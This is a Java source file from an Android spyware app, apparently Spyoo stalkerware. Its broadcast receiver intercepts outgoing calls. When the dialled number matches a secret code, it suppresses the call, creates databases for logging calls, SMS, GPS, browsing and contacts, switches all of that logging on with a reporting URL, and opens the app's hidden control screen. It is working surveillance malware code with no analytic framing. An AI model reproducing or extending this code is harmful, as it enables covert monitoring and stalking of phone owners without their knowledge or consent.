package iits.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneNumberUtils;
import iits.code.bus.Account_BUS;
import iits.code.bus.Call_BUS;
import iits.code.bus.GPS_BUS;
import iits.code.bus.SMS_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.bus.URL_BUS;
import iits.code.dto.Account_DTO;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.mamager.FileManager;
import iits.spyoo.Program;

public class LoginReceiver extends BroadcastReceiver {
    private static final String TAG = "LoginReceiver";

    public void onReceive(Context context, Intent intent) {
        try {
            if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
                String phoneNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
                Setting_DTO setting = Setting_BUS.get(context);
                if (setting == null) {
                    if (PhoneNumberUtils.compare(phoneNumber, Constants.SECRET_KEY)) {
                        FileManager.WriteLog(1, TAG, "Call secret key = " + phoneNumber);
                        setResultData(null);
                        FileManager.WriteLog(1, TAG, "create database");
                        Account_BUS.createTable(context);
                        Setting_BUS.createTable(context);
                        Call_BUS.createTable(context);
                        SMS_BUS.createTable(context);
                        GPS_BUS.createTable(context);
                        URL_BUS.createTable(context);
                        Setting_DTO setting2 = new Setting_DTO();
                        setting2.setSecretKey(Constants.SECRET_KEY);
                        setting2.setFlagSMS(true);
                        setting2.setFlagCall(true);
                        setting2.setFlagGPS(true);
                        setting2.setFlagURL(true);
                        setting2.setFlagSpyCall(false);
                        setting2.setFlagContact(true);
                        setting2.setReportTime(30);
                        setting2.setVertical(50);
                        setting2.setHorizontal(500);
                        setting2.setGPSInterval(5);
                        setting2.setSendSetting(true);
                        setting2.setRunMode(true);
                        setting2.setLink(Constants.URL);
                        Setting_BUS.insert(context, setting2);
                        if (Account_BUS.get(context) == null) {
                            Account_BUS.insert(context, new Account_DTO());
                        }
                        Intent i = new Intent(context, Program.class);
                        i.setFlags(268435456);
                        context.startActivity(i);
                    }
                } else if (PhoneNumberUtils.compare(phoneNumber, setting.getSecretKey())) {
                    FileManager.WriteLog(1, TAG, "Call secret key = " + phoneNumber);
                    setResultData(null);
                    Intent i2 = new Intent(context, Program.class);
                    i2.setFlags(268435456);
                    context.startActivity(i2);
                }
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onReceive function: " + e.toString());
        }
    }
}
